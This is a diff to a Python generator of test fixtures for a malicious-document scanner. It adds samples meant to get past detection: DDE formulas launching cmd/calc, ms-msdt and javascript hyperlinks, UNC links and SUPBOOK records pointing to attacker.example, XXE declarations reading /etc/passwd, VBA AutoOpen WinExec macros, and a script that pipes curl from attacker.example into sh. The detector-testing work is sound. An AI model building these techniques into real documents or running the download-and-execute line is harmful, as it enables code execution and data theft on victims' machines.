@@ -299,6 +299,11 @@ def rels(items: list[tuple[str, str, str, bool]]) -> bytes:
     return "".join(out).encode()
 
 
+def docx_ct_only() -> bytes:
+    return (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+            '<Default Extension="xml" ContentType="application/xml"/></Types>').encode()
+
+
 def docx(body: str = "<w:p><w:r><w:t>Quarterly notes.</w:t></w:r></w:p>", doc_rels=(), extra: dict | None = None,
          content_extra: str = "", main_ct: str = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
          doc_xml: str | None = None) -> bytes:
@@ -1005,6 +1010,16 @@ def main() -> None:
         return ("{\\object" + flags + "{\\*\\objclass " + classname + "}{\\*\\objdata " + data[:idx].hex()
                 + "\\bin1 " + data[idx:idx + 1].decode("latin-1") + data[idx + 1:].hex() + "}}")
     write(R / "office_rt2_rtf_bin_brace_equation.rtf", rtf(rtf_object_bin("Equation.3", b"}" + b"cmd /c calc.exe " + b"A" * 60, 0)))
+    # Two raw bytes at once (\bin2): the second '}' would close the object group if the bytes were read as syntax; and raw
+    # backslashes that are the start of a UNC path, so dropping them loses the target.
+    def rtf_object_bin2(classname: str, payload: bytes, flags: str = "\\objemb") -> str:
+        data = ole1_object(classname, payload)
+        idx = len(data) - len(payload)
+        assert data[idx:idx + 2] in (b"}}", b"\\\\")
+        return ("{\\object" + flags + "{\\*\\objclass " + classname + "}{\\*\\objdata " + data[:idx].hex()
+                + "\\bin2 " + data[idx:idx + 2].decode("latin-1") + data[idx + 2:].hex() + "}}")
+    write(R / "office_rt2_rtf_bin_braces_equation.rtf", rtf(rtf_object_bin2("Equation.3", b"}}" + b"cmd /c calc.exe " + b"A" * 60)))
+    write(R / "office_rt2_rtf_bin_unc.rtf", rtf(rtf_object_bin2("Foo.Bar", b"\\\\attacker.example\\share\\x.hta", "\\objautlink\\objupdate")))
     # An OLE Package whose first byte (the low byte of the stream's length) is 0x7D, so a raw '}' is natural data.
     pad = 0
     while (len(ole10native("invoice.exe", pe() + b"\x00" * pad)) - 4) & 0xFF != 0x7D:
@@ -1019,6 +1034,124 @@ def main() -> None:
     write(R / "office_rt2_rtf_noext", dde_rtf)
     write(R / "office_rt2_flat_opc.xml", flat(flat_parts))
     write(R / "office_rt2_plain_notes.txt", b"Meeting notes.\nThe RTF format is described in the specification.\n")
+
+    # ── found by the third round ───────────────────────────────────────────────────────────────────────
+    # DDE formulas: the pipe written as a character reference; a service that is not a shell but a topic that is.
+    def sheet_f(formula_xml: str) -> bytes:
+        return xlsx(f'<row r="1"><c r="A1"><f>{formula_xml}</f></c></row>')
+    write(R / "office_rt3_dde_pipe_cref.xlsx", sheet_f("cmd&#124;'/c calc'!A0"))
+    write(R / "office_rt3_dde_msexcel.xlsx", sheet_f("MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe'!''"))
+    write(R / "office_rt3_dde_calc.xlsx", sheet_f("calc|'x'!A0"))
+    write(R / "office_rt3_ddelink_msexcel.xlsx", xlsx(extra={
+        "xl/externalLinks/externalLink1.xml": (CT_HEAD + f'<externalLink xmlns="{smlns}"><ddeLink ddeService="MSEXCEL" '
+                                               'ddeTopic="..\\..\\Windows\\System32\\cmd.exe /c calc.exe"><ddeItems><ddeItem name="x"/></ddeItems></ddeLink></externalLink>').encode()}))
+    # PowerPoint: "ppaction:&#47;/program"
+    write(R / "office_rt3_ppaction_cref.pptx", pptx(extra={"ppt/slides/slide2.xml": (
+        CT_HEAD + '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">'
+        '<p:cSld><p:spTree><a:hlinkClick action="ppaction:&#47;/program"/></p:spTree></p:cSld></p:sld>').encode()}))
+    # ODF spreadsheets: DDE() with the quotes as &#34;, and with a service that is not on any shell list.
+    ods_ns = ODF_NS + ' xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2"'
+    def ods_dde(call: str) -> bytes:
+        raw = odf(mime="application/vnd.oasis.opendocument.spreadsheet",
+                  body=f'<table:table><table:table-row><table:table-cell table:formula="of:=DDE({call})"/></table:table-row></table:table>')
+        with zipfile.ZipFile(io.BytesIO(raw)) as z:
+            items = [(i.filename, z.read(i.filename)) for i in z.infolist()]
+        items = [(n, d.replace(ODF_NS.encode(), ods_ns.encode()) if n == "content.xml" else d) for n, d in items]
+        return zbytes(items, first_stored="mimetype")
+    write(R / "office_rt3_ods_dde_cref.ods", ods_dde("&#34;cmd&#34;;&#34;/c calc&#34;;&#34;A0&#34;"))
+    write(R / "office_rt3_ods_dde_calc.ods", ods_dde("&quot;calc&quot;;&quot;x&quot;;&quot;A0&quot;"))
+    # XXE in the parts that are not the main one
+    xxe_decl = '<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
+    write(R / "office_rt3_xxe_rels.docx", docx(extra={"_rels/.rels": (CT_HEAD + xxe_decl + rels([("rId1", "officeDocument", "word/document.xml", False)]).decode().split("?>", 1)[1]).encode()}))
+    base_odt_parts = lambda: [(i.filename, z0.read(i.filename)) for i in z0.infolist()]
+    with zipfile.ZipFile(io.BytesIO(odf())) as z0:
+        for nm, part in (("meta", "meta.xml"), ("settings", "settings.xml")):
+            items = base_odt_parts() + [(part, (CT_HEAD + xxe_decl + "<office:document-meta " + ODF_NS + "/>").encode())]
+            write(R / f"office_rt3_xxe_odf_{nm}.odt", zbytes(items, first_stored="mimetype"))
+        items = [(n, (d.replace(b"<manifest:manifest", xxe_decl.encode() + b"<manifest:manifest", 1) if n == "META-INF/manifest.xml" else d)) for n, d in base_odt_parts()]
+        write(R / "office_rt3_xxe_odf_manifest.odt", zbytes(items, first_stored="mimetype"))
+    # HYPERLINK is a field: the same targets that fail as a relationship fail here
+    def hyper_doc(instr: str, simple: bool = False) -> bytes:
+        if simple:
+            return docx(f'<w:p><w:fldSimple w:instr=\'{instr}\'><w:r><w:t>click</w:t></w:r></w:fldSimple></w:p>')
+        return field_doc(instr)
+    write(R / "office_rt3_hyperlink_msdt.docx", hyper_doc('HYPERLINK "ms-msdt:/id PCWDiagnostic /skip force"'))
+    write(R / "office_rt3_hyperlink_js.docx", hyper_doc('HYPERLINK "javascript:alert(1)"', simple=True))
+    write(R / "office_rt3_hyperlink_unc.docx", hyper_doc('HYPERLINK "\\\\\\\\attacker.example\\\\share\\\\x.docx"'))
+    write(R / "office_rt3_hyperlink_ok.docx", hyper_doc('HYPERLINK "https://example.com/docs" \\o "Docs"'))
+    write(R / "office_rt3_link_dotcom.docx", docx(doc_rels=[("rId5", "hyperlink", "mailto:sales@example.com", True),
+                                                        ("rId6", "hyperlink", "http://example.com", True)]))
+    write(R / "office_rt3_link_dotcom_path.docx", docx(doc_rels=[("rId5", "hyperlink", "file:///C:/Users/a/run.com", True)]))
+    # legacy .doc DDE: lower case, and a full path to the shell
+    wd = lambda txt: cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60 + txt + b"\x00", "1Table": b"\x00" * 64})
+    write(R / "office_rt3_dde_lower.doc", wd(b"ddeauto c:\\windows\\system32\\cmd.exe /k calc.exe"))
+    write(R / "office_rt3_dde_path.doc", wd(b'DDE "C:\\Windows\\System32\\cmd.exe" "/c calc"'))
+    write(R / "office_rt3_dde_prose.doc", wd(b"The DDE protocol is old. Run cmd to see it, or use the shell."))
+    # legacy .xls: SUPBOOK records carry DDE links ("application" 0x03 "topic") and external workbooks
+    def supbook(path: str) -> bytes:
+        data = path.encode("latin-1")
+        return struct.pack("<HHHHB", 0x01AE, 5 + len(data), 1, len(data), 0) + data
+    def xls_with(*records: bytes) -> bytes:
+        return cfb({"Workbook": bof() + boundsheet("Sheet1", 0, 0) + b"".join(records) + struct.pack("<HH", 0x000A, 0)})
+    write(R / "office_rt3_xls_supbook_dde.xls", xls_with(supbook("cmd\x03/c calc")))
+    write(R / "office_rt3_xls_supbook_unc.xls", xls_with(supbook("\x01\\\\attacker.example\\share\\book.xls")))
+    write(R / "office_rt3_xls_supbook_local.xls", xls_with(supbook("\x01C:\\data\\book.xls")))
+    # a truncated Workbook stream (the walk used to raise IndexError and end the whole analysis) beside a real DDE field
+    write(R / "office_rt3_truncated_workbook.doc", cfb({
+        "WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60 + b"DDEAUTO cmd /c calc\x00", "1Table": b"\x00" * 64,
+        "Workbook": bof() + struct.pack("<HH", 0x0085, 100) + b"\x00" * 3}))
+    # packages that are two things
+    base_docx = docx(doc_xml=CT_HEAD + f'<w:document {NS_W}><w:body>' + dde_run.format(p="w") + "</w:body></w:document>")
+    with zipfile.ZipFile(io.BytesIO(base_docx)) as z1:
+        items = [(i.filename, z1.read(i.filename)) for i in z1.infolist()] + [("mimetype", b"application/vnd.oasis.opendocument.text")]
+    write(R / "office_rt3_polyglot_docx_odf.docx", zbytes(items, first_stored=None))
+    macro_odt = odf_macro_doc("office:load")
+    with zipfile.ZipFile(io.BytesIO(macro_odt)) as z2:
+        items = [(i.filename, z2.read(i.filename)) for i in z2.infolist() if i.filename != "mimetype"]
+    items.append(("[Content_Types].xml", docx_ct_only()))
+    write(R / "office_rt3_polyglot_odt_ooxml.odt", zbytes(items))
+    # one part nobody can read does not stop the others
+    unreadable = bytearray(odf_macro_doc("office:load") if False else macro_odt)
+    items = [(i, z) for i, z in []]
+    with zipfile.ZipFile(io.BytesIO(macro_odt)) as z3:
+        items = [(i.filename, z3.read(i.filename)) for i in z3.infolist()] + [("Object 1/content.xml", b"stray part " * 20)]
+    stray = bytearray(zbytes(items, first_stored="mimetype"))
+    for sig, off_name, off_method in ((b"PK\x03\x04", 30, 8), (b"PK\x01\x02", 46, 10)):
+        i = stray.find(sig)
+        while i != -1:
+            nl = struct.unpack_from("<H", stray, i + (26 if sig == b"PK\x03\x04" else 28))[0]
+            if bytes(stray[i + off_name:i + off_name + nl]) == b"Object 1/content.xml":
+                struct.pack_into("<H", stray, i + off_method, 99)
+            i = stray.find(sig, i + 4)
+    write(R / "office_rt3_stray_unreadable.odt", bytes(stray))
+    # a main part stored under a .rels name outside _rels/
+    write(R / "office_rt3_main_as_rels.docx", zbytes([
+        ("[Content_Types].xml", (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+                                 '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
+                                 '<Override PartName="/doc/main.rels" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>').encode()),
+        ("_rels/.rels", rels([("rId1", "officeDocument", "doc/main.rels", False)])),
+        ("doc/main.rels", (CT_HEAD + f'<w:document {NS_W}><w:body>' + dde_run.format(p="w") + "</w:body></w:document>").encode())]))
+    # VBA: launching a program through WinExec; parsing XML is not downloading
+    vba_winexec = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function WinExec Lib "kernel32" (ByVal cmd As String, ByVal show As Long) As Long\n'
+                   'Sub AutoOpen()\n    WinExec "calc.exe", 1\nEnd Sub\n')
+    vba_dom = ('Attribute VB_Name = "ThisWorkbook"\nSub Workbook_Open()\n    Dim d As Object\n    Set d = CreateObject("MSXML2.DOMDocument.6.0")\n'
+               '    d.loadXML "<a/>"\nEnd Sub\n')
+    write(R / "office_rt3_vba_winexec.docm", docx(extra={"word/vbaProject.bin": cfb(vba_project({"ThisDocument": vba_winexec}))}, content_extra=vba_ct,
+                                                 main_ct="application/vnd.ms-word.document.macroEnabled.main+xml"))
+    write(R / "office_rt3_vba_msxml_dom.xlsm", xlsx(extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": vba_dom}))},
+        content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
+        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
+    # OLE Package payloads: an extension that runs without being an .exe, and a PE whose header lies past 4 KB
+    far_pe = b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x2000) + b"\x00" * (0x2000 - 0x40) + b"PE\x00\x00" + b"\x00" * 64
+    def pkg_doc(name: str, payload: bytes) -> bytes:
+        return cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
+                    "ObjectPool": {"_2": {"\x01Ole10Native": ole10native(name, payload), "\x01CompObj": b"Package\x00"}}})
+    write(R / "office_rt3_pkg_xll.doc", pkg_doc("addin.xll", b"not a pe " * 8))
+    write(R / "office_rt3_pkg_far_pe.doc", pkg_doc("notes.dat", far_pe))
+    write(R / "office_rt3_pkg_text.doc", pkg_doc("notes.txt", b"just some notes " * 8))
+    # A file that merely mentions {\rtf is handed back to the scanner its name and shebang call for.
+    write(R / "office_rt3_script_mentions_rtf", b"#!/bin/sh\n#{\\rtf1 notes\ncurl -s http://attacker.example/x.sh | sh\n")
+    write(R / "office_rt3_notes_mentions_rtf.txt", b"RTF {\\rtf1 starts so. The admin password = Hunter2Hunter2 was shared by mail.\n")
 
     # ── legacy binary (OLE2) ────────────────────────────────────────────────
     write(R / "office_legacy_macro.doc", cfb({
